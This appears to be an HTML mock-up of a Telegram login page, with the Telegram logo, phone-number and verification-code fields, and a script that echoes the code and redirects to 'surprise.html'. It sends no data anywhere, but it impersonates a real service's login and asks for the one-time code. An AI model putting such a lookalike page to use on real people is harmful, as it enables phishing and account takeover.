<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Login</title>
    <style>
        /* Include your previous CSS here, unchanged */
    </style>
</head>

<body>

    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/af/Telegram_logo.svg" alt="Telegram Logo" class="logo">
        <h2>Log in to Telegram</h2>
        
        <!-- Phone number input -->
        <div class="form-group">
            <label for="phone" class="label">Enter your phone number</label>
            <input type="tel" id="phone" class="input-field" placeholder="+1 123 456 7890" required>
        </div>
        
        <!-- Verification code input -->
        <div class="form-group">
            <label for="verification-code" class="label">Enter verification code</label>
            <input type="text" id="verification-code" class="input-field" placeholder="12345" required oninput="updateVerificationCode()">
        </div>

        <!-- Real-time Display of Verification Code -->
        <div class="verification-code-display">
            <span>Your verification code: <span id="code-display">None</span></span>
        </div>
        
        <button class="submit-btn" onclick="verifyCode()">Log in</button>
        
        <div class="small-text">
            <p>Having trouble logging in? <a href="#">Learn more</a></p>
            <p>Don't have a Telegram account? <a href="#">Sign up</a></p>
        </div>
    </div>

    <script>
        // Update the verification code in real-time
        function updateVerificationCode() {
            const verificationCode = document.getElementById("verification-code").value;
            document.getElementById("code-display").textContent = verificationCode ? verificationCode : "None";
        }

        // Verify the code and redirect to surprise page
        function verifyCode() {
            var verificationCode = document.getElementById("verification-code").value;
            if (verificationCode) {
                // Redirect to the surprise page after login
                window.location.href = "surprise.html";
            } else {
                alert("Please enter the verification code.");
            }
        }
    </script>

</body>

</html>
